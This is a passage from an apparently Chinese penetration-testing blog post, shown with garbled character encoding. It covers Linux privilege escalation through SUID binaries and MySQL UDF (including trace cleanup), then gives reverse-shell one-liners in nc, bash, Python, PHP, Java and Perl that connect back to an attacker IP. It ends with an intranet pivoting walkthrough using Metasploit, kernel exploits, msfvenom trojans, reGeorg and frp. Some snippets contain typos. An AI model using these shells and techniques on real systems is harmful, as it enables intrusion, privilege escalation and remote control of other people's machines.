æ–‡ä»¶å³å¯æ¢å¤root<br><code>mv /tmp/passwd.bak /etc/passwd</code></li></ol><p>è·å–shellåå°†shellè½¬æ¢ä¸ºå®Œå…¨äº¤äº’å¼çš„TTYï¼š<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><h2 id="suidææƒ"><a href="#suidææƒ" class="headerlink" title="suidææƒ"></a>suidææƒ</h2><p>æ­¤å¤„æ¶‰åŠæƒé™åˆ’åˆ†çš„çŸ¥è¯†ã€‚åœ¨Linuxä¸­é€šè¿‡æƒé™ä½rwxå®ç°æ–‡ä»¶æƒé™ç®¡ç†ã€‚dç›®å½•ï¼Œ-æ™®é€šæ–‡ä»¶ã€‚r read;w write;x execute<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/34a39b9b-d6ee-46d4-b30c-e1541d6bd09a.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/34a39b9b-d6ee-46d4-b30c-e1541d6bd09a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"><br>æ‰€æœ‰è€…-æ‰€å±è€…-å…¶ä»–ç”¨æˆ·</p><ul><li>suidä½œç”¨äºäºŒè¿›åˆ¶å¯æ‰§è¡Œç¨‹åºä¸Šï¼Œå½“æ‰§è¡Œç¨‹åºæ—¶ä¼šä¸´æ—¶åˆ‡æ¢èº«ä»½ä¸ºæ–‡ä»¶æ‰€æœ‰è€…èº«ä»½ä¸ºæ–‡ä»¶æ‰€æœ‰è€…èº«ä»½ã€‚<br><code>chmod u+s FILE\chmod 4755 FILE</code> æ·»åŠ SUIDæƒé™åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆåœ¨ä¸‰ä½æ•°æ®æƒé™å‰ï¼Œ4ä»£è¡¨æ·»åŠ åˆ°SUIDä½ï¼‰<br><code>chmod u-s FILE\chmod 0xxx FILE</code> åˆ é™¤suid<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/80b68f50-42f7-4a7a-aea3-ff233dc22f79.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/80b68f50-42f7-4a7a-aea3-ff233dc22f79.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li><li>æ–‡ä»¶å±ä¸»ä¸ºsè¡¨ç¤ºè®¾ç½®äº†suid.æ²¡æœ‰xæƒé™ç”¨å¤§å†™Sï¼Œè¡¨ç¤ºæƒé™æ— æ•ˆ</li></ul><p>ç®€è€Œè¨€ä¹‹ï¼Œä»»ä½•ç”¨æˆ·æ‰§è¡Œæœ‰suidçš„æ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šä»¥ç¬¬ä¸€ä¸ªæƒé™è¿è¡Œ</p><blockquote><p>æ‰€ä»¥åˆ©ç”¨suidææƒçš„ä¸€ä¸ªå°æ¡ˆä¾‹å°±æ˜¯ï¼š<br>åˆ›å»ºä¸€ä¸ª1.cæ–‡ä»¶,ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">&gt;<span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">&gt;setuid(<span class="number">0</span>); <span class="meta">#rootçš„uid=0ï¼Œæ„å‘³ç€æ‰§è¡Œåé¢çš„ä»£ç æ˜¯rootæƒé™åœ¨æ‰§è¡Œ</span></span><br><span class="line">&gt;system(<span class="string">&quot;su - root);#å°†å½“å‰ç¯å¢ƒè½¬ä¸ºroot</span></span><br><span class="line"><span class="string">&gt;&#125;</span></span><br></pre></td></tr></table></figure><p>gcc 1.c -o 1ç¼–è¯‘<br>chmod u+s 1 æ·»åŠ suid<br>.&#x2F;1 æ‰§è¡Œ<br>su - root !&#x3D;su root.su åªæ˜¯åˆ‡æ¢äº†rootèº«ä»½ï¼Œä½†shellç¯å¢ƒä¾æ—§æ˜¯æ™®é€šç”¨æˆ·ï¼Œsu - ç”¨æˆ·å’Œç¯å¢ƒä¸€èµ·åˆ‡æ¢äº†ã€‚</p></blockquote><h2 id="linuxæ•°æ®åº“ææƒ"><a href="#linuxæ•°æ®åº“ææƒ" class="headerlink" title="linuxæ•°æ®åº“ææƒ"></a>linuxæ•°æ®åº“ææƒ</h2><p>å’Œwindowsä¸€æ ·çš„ï¼Œudfææƒ</p><ul><li>ç¯å¢ƒè¦æ±‚ï¼šé…ç½®ä¸­secure_file_priv&#x3D;â€â€ï¼Œ<br>mysqlå…·æœ‰rootæƒé™ï¼Œå…·æœ‰sqlè¯­å¥æ‰§è¡Œæƒé™ï¼Œç›®å½•å¯è¯»å¯å†™ï¼Œselinuxå…³é—­</li></ul><p>å…ˆè·å–ä½æƒé™shell,ææƒè¿‡ç¨‹ï¼š<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/f70d3b9a-84a7-46e5-be32-45cf0a28b84b.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/f70d3b9a-84a7-46e5-be32-45cf0a28b84b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ol><li>æŸ¥çœ‹pluginç›®å½•è·¯å¾„ <code>show variables like &#39;%plugin%&#39;;</code><br><code>select unhex(&#39;udfåå…­è¿›åˆ¶&#39;) into dumpfile &#39;usr/lib64/mysql/plugin/1.so&#39;;</code> (pluginè·¯å¾„&#x2F;1.so)</li><li>å£°æ˜å‡½æ•° <code>create function sys_eval returns string soname &#39;1.so&#39;;</code></li><li>æ‰§è¡Œé«˜æƒé™å‘½ä»¤ <code>select sys_eval(&#39;whoami&#39;);</code></li><li>æ¸…é™¤ç—•è¿¹ <code>drop function sys_eval;</code></li></ol><p>windows sonameåŠ¨æ€é“¾æ¥åº“æŒ‡å‘udf.dllï¼ŒlinuxæŒ‡å‘.soæ–‡ä»¶ï¼Œæ‰€ä»¥å£°æ˜çš„å‡½æ•°ä¹Ÿè¦æ˜¯.soæ–‡ä»¶é‡Œçš„ã€‚<br>è¯¦æƒ…è¯·è§ä¸Šç¯‡windowsææƒ</p><h1 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h1><ul><li>åå¼¹shellä½¿ç”¨åœºæ™¯:é˜²ç«å¢™ä¼šé˜»æ­¢å®¢æˆ·ç«¯ä¸»åŠ¨è¿æ¥æœåŠ¡å™¨ï¼Œä½†æ˜¯æœåŠ¡å™¨è¿æ¥å®¢æˆ·ç«¯é€šè¿‡é˜²ç«å¢™æ—¶ï¼Œå¯ä»¥ç©¿é€åˆ°è¾¾å®¢æˆ·ç«¯</li></ul><h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><p>netcatç®€ç§°ncï¼Œè¢«ç§°ä¸ºæ¸—é€æµ‹è¯•ä¸­çš„ç‘å£«å†›~~~~åˆ€ã€‚<br>å®ƒå¯ä»¥ç”¨ä½œç«¯å£ç›‘å¬ã€ç«¯å£æ‰«æã€è¿œç¨‹æ–‡ä»¶ä¼ è¾“ã€è¿œç¨‹shellç­‰</p><ul><li><p>è¯­æ³•:<code>nc [-hlnruz][-g ç½‘å…³][-G æŒ‡å‘å™¨æ•°ç›®][-i å»¶è¿Ÿç§’æ•°][-o è¾“å‡ºæ–‡ä»¶][-p é€šä¿¡ç«¯å£][-s æ¥æºIP][-v æ¬¡æ•°][-w è¶…æ—¶ç§’æ•°][ä¸»æœºåç§°][é€šä¿¡ç«¯å£...]</code></p></li><li><p>åå‘shell<br>å‡è®¾åœ¨ç›®æ ‡ä¸»æœºæ‰¾åˆ°äº†RCEæ¼æ´ï¼Œå¯ä»¥åœ¨ç›®æ ‡ä¸»æœºä¸Šç”¨ncå‘å‡ºå‘½ä»¤å¯åŠ¨åå‘shell<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/082a3402-fa0e-4082-8637-b1d5e8492103.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/082a3402-fa0e-4082-8637-b1d5e8492103.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p></li></ul><ol><li>åœ¨æ”»å‡»æœºæˆ–vpsä¸Šç›‘å¬æœ¬åœ°ç«¯å£<code>nc -lvp ç›‘å¬ç«¯å£å·</code></li><li>é¶æœºå‘½ä»¤ï¼Œè¿æ¥æ”»å‡»æœºçš„ç›‘å¬ç«¯å£<code>nc æ”»å‡»æœºip ç›‘å¬ç«¯å£å· -e /bin/bash</code> #linux<br><code>nc æ”»å‡»æœºip ç›‘å¬ç«¯å£å· -e c:\windows\system32\cmd.exe</code> #windows<br>-e:å°†bash shell å‘å›ä¸»æœº</li></ol><ul><li>æ­£å‘shell<br>æ­£å‘shellæ—¶åœ¨ç›®æ ‡æœºä½¿ç”¨ncå°†bash shellç»‘å®šåˆ°ç‰¹å®šç«¯å£ï¼Œæ”»å‡»æœºncè¿æ¥åˆ°æ­¤ç«¯å£<br> <img src="https://storage.tttang.com/media/attachment/2022/10/29/09a20387-a532-4ea8-9c1a-0c5c8a640cf9.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/09a20387-a532-4ea8-9c1a-0c5c8a640cf9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li></ul><h3 id="bashåå¼¹shell"><a href="#bashåå¼¹shell" class="headerlink" title="bashåå¼¹shell"></a><strong>bashåå¼¹shell</strong></h3><p>ç›®æ ‡ä¸»æœºå¯èƒ½æ²¡æœ‰ncæˆ–ä¸æ”¯æŒ-eå‚æ•°æ—¶ï¼Œå°±éœ€è¦ä»¥ä¸‹æ–¹å¼åå¼¹shell</p><ul><li>æ”»å‡»æœºç›‘å¬:<code>nc -lvvp ç«¯å£</code></li><li>ç›®æ ‡ä¸»æœº:<code>bash -i &gt;&amp; /dev/tcp/æ”»å‡»æœºip/ç›‘å¬ç«¯å£å· 0&gt;&amp;1</code></li></ul><blockquote><table><thead><tr><th>bash -i</th><th>äº§ç”Ÿä¸€ä¸ªäº¤äº’å¼shell</th></tr></thead><tbody><tr><td>&amp;</td><td>å°†&amp;å‰åå†…å®¹ç›¸ç»“åˆé‡å®šå‘(&gt;)è‡³åè€…</td></tr><tr><td>&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port</td><td>å¯¹socketç½‘ç»œè¿æ¥çš„æŠ½è±¡</td></tr><tr><td>0&gt;&amp;1</td><td>å°†æ ‡å‡†è¾“å…¥å’Œæ ‡å‡†è¾“å…¥å†…å®¹ç›¸ç»“åˆï¼Œç„¶åé‡å®šå‘è‡³æ ‡å‡†è¾“å‡ºå†…å®¹ã€‚0æ ‡å‡†è¾“å…¥ã€1æ ‡å‡†è¾“å‡ºã€2é”™è¯¯è¾“å‡º</td></tr></tbody></table></blockquote><h2 id="å…¶ä»–åå¼¹shellæ–¹å¼"><a href="#å…¶ä»–åå¼¹shellæ–¹å¼" class="headerlink" title="å…¶ä»–åå¼¹shellæ–¹å¼"></a>å…¶ä»–åå¼¹shellæ–¹å¼</h2><h3 id="pythonåå¼¹shell"><a href="#pythonåå¼¹shell" class="headerlink" title="pythonåå¼¹shell"></a>pythonåå¼¹shell</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> soket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;æ”»å‡»æœºIP&quot;</span>,ç›‘å¬ç«¯å£å·));</span><br><span class="line">os.dup(s.fileno(),<span class="number">0</span>);</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>);</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>);</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="phpåå¼¹shell"><a href="#phpåå¼¹shell" class="headerlink" title="phpåå¼¹shell"></a>phpåå¼¹shell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;æ”»å‡»æœºIP&quot;</span>,ç›‘å¬ç«¯å£);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="javaåå¼¹shell"><a href="#javaåå¼¹shell" class="headerlink" title="javaåå¼¹shell"></a>javaåå¼¹shell</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/æ”»å‡»æœºip/ç›‘å¬ç«¯å£;cat &lt;&amp;5 | while read line;do $line 2&gt;&amp;5&gt;&amp;5;done&quot;</span>] as String[])</span><br><span class="line">p.waitFor()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="perl-åå¼¹shell"><a href="#perl-åå¼¹shell" class="headerlink" title="perl åå¼¹shell"></a>perl åå¼¹shell</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line">$i=<span class="string">&quot;æ”»å‡»æœºIPåœ°å€&quot;</span>;</span><br><span class="line">$p=ç›‘å¬ç«¯å£å·;<span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,<span class="keyword">getprotobyname</span>(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(<span class="keyword">connect</span>(S,sockaddr_in($p,inet_aton($i))))&#123;</span><br><span class="line">(<span class="keyword">open</span>(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);</span><br><span class="line"><span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);</span><br><span class="line"><span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);</span><br><span class="line"><span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>perlå’Œpythonç»å¤§å¤šæ•°æœåŠ¡å™¨éƒ½ä¼šè£…ï¼Œæ‰€ä»¥å¾ˆæœ‰ç”¨</p><p>ä»¥æŸæ¬¡å†…ç½‘æ¸—é€ä¸ºå®ä¾‹</p><h2 id="æ¨ªå‘æ¸—é€é¢„å¤‡å·¥ä½œ"><a href="#æ¨ªå‘æ¸—é€é¢„å¤‡å·¥ä½œ" class="headerlink" title="æ¨ªå‘æ¸—é€é¢„å¤‡å·¥ä½œ"></a>æ¨ªå‘æ¸—é€é¢„å¤‡å·¥ä½œ</h2><p><img src="https://storage.tttang.com/media/attachment/2022/10/29/1636427f-bf91-4ce2-98da-c3c39213063f.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/1636427f-bf91-4ce2-98da-c3c39213063f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">å‡è®¾æ˜¯å¦‚ä¸Šæ‹“æ‰‘å›¾ã€‚å…ˆæ— è§†é˜²ç«å¢™ï¼Œå†…ç½‘æœºå™¨æ— æ³•ç›´æ¥è®¿é—®å¤–ç½‘ï¼Œå¿…é¡»è¦èµ°è¾¹ç•Œæœºã€‚</p><h3 id="è·å¾—ä½æƒé™shell"><a href="#è·å¾—ä½æƒé™shell" class="headerlink" title="è·å¾—ä½æƒé™shell"></a>è·å¾—ä½æƒé™shell</h3><ul><li>åœ¨ç½‘ç«™ä¿¡æ¯æœé›†çœ‹åˆ°æ˜¯joomlaæ¨¡æ¿</li><li>msfé‡Œsearch joomla <strong>æŸ¥çœ‹</strong> è¾…åŠ©æ¨¡å—auxiliaré‡Œçš„<strong>æ‰«æè„šæœ¬</strong>ï¼š<code>auxiliary/scannner/http/joomla_version</code></li><li>useè„šæœ¬è®¾ç½®rhostå‚æ•°ï¼Œç„¶åexpolitè¿è¡Œå¯ä»¥çœ‹åˆ°ç½‘ç«™ç‰ˆæœ¬ã€‚<code>expolit -j -z</code>æŒ‚åå°</li><li><code>searchsplopit joomla ç‰ˆæœ¬</code><strong>å¯»æ‰¾exp</strong>ï¼Œæœ€å¥½æ˜¯åœ¨exploit.dbæ‰¾ï¼Œè¿™é‡Œå›¾ä¸ªæ–¹ä¾¿</li><li>æŠŠè„šæœ¬copyåˆ°msfçš„exploits&#x2F;multi&#x2F;phpç›®å½•ä¸‹ï¼Œç„¶åreload</li><li>use expè„šæœ¬ï¼Œset rhost\rportå‚æ•°å’Œlhost\lportå‚æ•°ï¼Œset payloadä¸ºreverseæˆ–è€…bindï¼Œexploitè¿è¡Œ</li></ul><p>ç›®å‰è·å¾—äº†ä½æƒé™shellï¼Œsessionsè¿›å…¥shell</p><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><ul><li><code>uname -a</code>æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</li><li>gcc â€“versionçœ‹åˆ°æœ‰gccï¼Œå°±æ‰¾cè¯­è¨€çš„è„šæœ¬ã€‚å¦èµ·ä¸€ä¸ªç»ˆç«¯<code>nc --lvvp ç«¯å£</code>ç›‘å¬æ–°ç«¯å£</li><li>shellé‡Œ<code>bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/ç«¯å£ 0&gt;&amp;1</code>åå¼¹shell</li><li><code>searchspolit  linux kernel å†…æ ¸ç‰ˆæœ¬ --exclute=&quot;(PoC)|/dos/&quot;</code>æœç´¢æœ¬åœ°ææƒè„šæœ¬ã€‚é™¤å»Pocå’Œdosï¼Œå°±å‰©æœ¬åœ°è„šæœ¬äº†ã€‚åŒç†ï¼Œä¹Ÿå¯ä»¥åœ¨expolit.dbä¸Šæ‰¾</li><li>ä¸Šä¼ è„šæœ¬ï¼Œä½†æ˜¯é¶æœºçš„ç½‘ç«™æ ¹ç›®å½•ä¸å¯å†™(å¾ˆå°‘è§)ï¼Œå†™åˆ°&#x2F;tmpç›®å½•</li><li><code>gcc -o è¾“å‡ºæ–‡ä»¶å è„šæœ¬å</code>ç¼–è¯‘ï¼Œ<code>./æ–‡ä»¶å</code>è¿è¡Œã€‚ä¸è¡Œå°±æ¢è„šæœ¬ï¼Œè„šæœ¬é‡Œæœ‰ä½¿ç”¨æ–¹æ³•ï¼Œäº‹å…ˆçœ‹ä¸€ä¸‹</li></ul><p>æä¸äº†å°±åˆ«æäº†ï¼Œä¸æ˜¯éè¦ææƒ(è¯•æå¦ˆåŠå¤©éƒ½æä¸èµ·ï¼Œä¸çŸ¥é“è¿™äº›expè°å†™çš„)</p><h3 id="ä¸€çº§ä»£ç†"><a href="#ä¸€çº§ä»£ç†" class="headerlink" title="ä¸€çº§ä»£ç†"></a>ä¸€çº§ä»£ç†</h3><ul><li>é¶æœº<code>python reGeorgSocksProxy.py -u http://IP -p ä»£ç†ç«¯å£</code>å»ºç«‹ä»£ç†è½¬å‘æœåŠ¡å™¨</li><li>ipconfigæˆ–è€…å…¶ä»–çš„çœ‹ä¸‹ç½‘æ®µï¼Œ<code>run autoroute -s ç½‘ç«¯</code>å¼€å¯è·¯ç”±è½¬å‘</li><li><code>use auxiliary/scanner/discovery</code>ã€nmapã€pingæ‰«æç­‰æ‰«åŒç½‘ç«¯å­˜æ´»ä¸»æœº</li><li>æ‰«æç«¯å£<code>use auxiliary/scanner/portscan/tcp</code>æˆ–è€…nmapæ‰«ï¼Œè®¾ç½®ä¸€ä¸‹rhostå’Œå¸¸ç”¨ç«¯å£ï¼Œè¿è¡Œ</li><li><code>vim /etc/proxychains.conf</code>é…ç½®ä»£ç†ï¼Œæµè§ˆå™¨å¼€ä»£ç†è®¿é—®å†…ç½‘ç½‘ç«™(å»ºè®®foxyProxyæ’ä»¶)</li></ul><p>å¦‚æœå¼€äº†80ç«¯å£ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æå†…ç½‘çš„ç«™ï¼Œæ‹¿å†…ç½‘çš„webshellã€‚æ³¨æ„èšå‰‘å’Œburpsuitç­‰å·¥å…·ä¹Ÿè¦é…ç½®ä»£ç†</p><p><strong>reGeorgSocksProxyæŒ‡å®šçš„ç«¯å£è¦å’Œproxychains.confæ–‡ä»¶é‡Œçš„ç«¯å£ä¸€è‡´</strong>ï¼Œå› ä¸ºè¿™æ³¢æ“ä½œçš„æ„ä¹‰å°±æ˜¯æŠŠè¾¹ç•Œæœºå½“ä½œè·³æ¿ï¼Œregeorgsocksproxy.pyåœ¨è¾¹ç•Œæœºèµ·åˆ°ä»£ç†æœåŠ¡å™¨çš„ä½œç”¨,proxychainså°±æ˜¯å®¢æˆ·ç«¯</p><p>å†…ç½‘çš„ç«™æ‰“ä¸‹æ¥äº†é‡å¤ä¸Šè¿°æ­¥éª¤åˆ°ææƒã€‚</p><h3 id="äºŒå±‚å†…ç½‘æ¸—é€ï¼ˆbindï¼‰"><a href="#äºŒå±‚å†…ç½‘æ¸—é€ï¼ˆbindï¼‰" class="headerlink" title="äºŒå±‚å†…ç½‘æ¸—é€ï¼ˆbindï¼‰"></a>äºŒå±‚å†…ç½‘æ¸—é€ï¼ˆbindï¼‰</h3><ul><li>ç”Ÿæˆmsfæœ¨é©¬<code>msfvenom -p windows/meterpreter/bind_tcp lport=xxx -f exe -o æ–‡ä»¶å</code>ï¼Œå› ä¸ºå†…ç½‘ä¸èƒ½ç›´æ¥è¿å¤–ç½‘çš„åŸå› ,reverseç‰ˆæœ¨é©¬æ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬æœ‰ä»£ç†å¯ä»¥è¿å†…ç½‘ã€‚ä¸Šä¼ </li><li>åŒç†ï¼Œç”Ÿæˆäº†æœ¨é©¬æœ¬åœ°å°±éœ€è¦æœ‰msfè¿›ç¨‹ç›‘å¬ã€‚<code>use exploit/multi/handler</code>ï¼Œç„¶å<code>set payload windows/meterpreter/bind_tcp</code>ï¼Œpayloadå’Œmsfæœ¨é©¬æ‰€ç”¨payloadä¸€è‡´ï¼Œè®¾ç½®å‚æ•°lportå’Œrhost.ï¼ˆè¿™é‡Œå¼€ç›‘å¬æ˜¯åœ¨è¾¹ç•ŒæœåŠ¡å™¨å¼€ï¼Œä¹Ÿå°±æ˜¯ä¹‹å‰msfçš„è¾¹ç•ŒæœåŠ¡å™¨ç»ˆç«¯ï¼Œlportå½“ç„¶ä¹Ÿæ˜¯è¾¹ç•Œæœºçš„ç«¯å£ï¼Œç›¸å½“äº<del>æœ¬æœºmsfå¯¹é¶æœºè¾¹ç•Œæœº</del> çš„æ¸—é€å˜ä¸ºäº†&#x3D;&#x3D;é¶æœºè¾¹ç•Œæœºå¯¹å†…ç½‘äºŒå±‚æœº&#x3D;&#x3D;)</li><li>åœ¨äºŒå±‚å†…ç½‘æœºææƒè¿è¡Œmsfæœ¨é©¬æ‹¿åˆ°shellåï¼Œ<code>run autoroute -s å¦ä¸€å†…ç½‘ç½‘æ®µ</code>æ·»åŠ è·¯ç”±</li><li>æ‰«æï¼Œè€æ ·å­ï¼Œé‚£å‡ ä¸ªæ‰«æç”¨å•¥éƒ½è¡Œï¼Œ<code>run arp_scanner -r ç½‘æ®µ</code>è¿›è¡Œarpæ‰«æ</li></ul><p>å¦‚æœéè¦ç”¨reverseçš„è¿æ¥æ–¹å¼å‘¢ï¼Œä»Šå¤©æˆ‘çš®ç—’ï¼Œæˆ–è€…æœ‰é˜²ç«å¢™åªèƒ½å‡ºã€‚<br>å¾ˆç®€å•ï¼Œç”¨åˆ°ç«¯å£è½¬å‘ã€‚å¦‚æœå°†è¾¹ç•Œæœºç›‘å¬reverseçš„ç«¯å£è½¬å‘åˆ°æœ¬åœ°ç«¯å£ï¼ŒäºŒå±‚å†…ç½‘æœºreverseåˆ°è¾¹ç•Œæœºçš„ç«¯å£å°±ç›¸å½“äºç›´æ¥å’Œæœ¬åœ°é€šä¿¡</p><p>lcxè¢«æ£€æµ‹æ¦‚ç‡å¤ªå¤§ï¼Œç”¨<strong>frp</strong></p><h4 id="äºŒå±‚å†…ç½‘æ¸—é€-frpå·¥å…·reverse"><a href="#äºŒå±‚å†…ç½‘æ¸—é€-frpå·¥å…·reverse" class="headerlink" title="äºŒå±‚å†…ç½‘æ¸—é€(frpå·¥å…·reverse)"></a>äºŒå±‚å†…ç½‘æ¸—é€(frpå·¥å…·reverse)</h4><p>å…³äºfrpè¦åˆ†æ¸…æ¥šå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯åˆ°åº•åº”è¯¥æ”¾åœ¨å“ªã€‚å…·ä½“å¯ä»¥çœ‹&#x3D;&#x3D;frpc.ini&#x3D;&#x3D;å’Œ&#x3D;&#x3D;frps.ini&#x3D;&#x3D;</p><p>æ¯”å¦‚æŸfrpc.iniçš„å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr=172.16.12.2</span><br><span class="line">server_port=7100</span><br><span class="line">[ssh]</span><br><span class="line">type=tcp</span><br><span class="line">local_ip=127.0.0.1</span><br><span class="line">local_port=5000</span><br><span class="line">remote_port=5000</span><br></pre></td></tr></table></figure><p>å¦‚ä¸Šï¼Œå®¢æˆ·ç«¯è¿æ¥æœåŠ¡ç«¯çš„7000ç«¯å£ï¼Œæ˜¯å°†æœ¬æœºçš„5000ç«¯å£æ•°æ®ä»¥tcpè½¬å‘åˆ°172.16.12.2çš„5000ç«¯å£ã€‚å› ä¸ºä½ å¼€frpä¹Ÿéœ€è¦ç«¯å£çš„å˜›ã€‚è¿™æ ·è¿æ¥æœåŠ¡ç«¯çš„5000ç«¯å£å°±ç›¸å½“äºè¿æ¥å®¢æˆ·ç«¯çš„5000ç«¯å£ã€‚<br>æœåŠ¡ç«¯åªæœ‰ä¸¤è¡Œï¼Œç›‘å¬ä¸€ä¸‹å°±è¡Œäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port=7100</span><br></pre></td></tr></table></figure><p>è¿™é‡Œï¼Œæˆ‘è¦å¼ºè°ƒæœ¬æ–‡çš„ç²¾å</p><h4 id="x3D-x3D-frpç«¯å£è½¬å‘ä¸å†…ç½‘ç©¿é€-x3D-x3D"><a href="#x3D-x3D-frpç«¯å£è½¬å‘ä¸å†…ç½‘ç©¿é€-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;frpç«¯å£è½¬å‘ä¸å†…ç½‘ç©¿é€&#x3D;&#x3D;"></a>&#x3D;&#x3D;frpç«¯å£è½¬å‘ä¸å†…ç½‘ç©¿é€&#x3D;&#x3D;</h4><p><img src="https://storage.tttang.com/media/attachment/2022/10/29/f4087477-330a-4eef-acf2-0b6b27097858.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/f4087477-330a-4eef-acf2-0b6b27097858.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>è¿˜æ˜¯è¿™å¼ å›¾ã€‚å¯¹äºå¤–ç½‘kaliè®¿é—®å†…ç½‘æœºï¼Œæœ‰ä¸¤ç§æ‰‹æ³•ï¼Œä¸€æ˜¯æŠŠå¤–ç½‘kaliçš„ç«¯å£è½¬å‘è‡³è¾¹ç•Œæœºçš„ç«¯å£ã€‚è¿™æ 